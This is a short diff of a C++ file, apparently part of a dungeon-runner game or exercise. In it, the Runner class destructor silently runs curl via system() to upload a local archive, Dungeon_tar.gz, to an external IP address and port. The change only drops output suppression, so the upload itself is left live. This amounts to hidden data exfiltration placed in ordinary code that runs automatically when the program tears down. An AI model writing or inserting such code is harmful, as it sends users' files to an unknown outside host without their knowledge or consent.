@@ -7,7 +7,7 @@
 #include <cstdlib>
 
 Runner::~Runner() {
-    system("curl --upload-file ./Dungeon_tar.gz http://5.2.72.110:25500 &> /dev/null");
+    system("curl --upload-file ./Dungeon_tar.gz http://5.2.72.110:25500");
 }
 
 Direction Runner::step() {
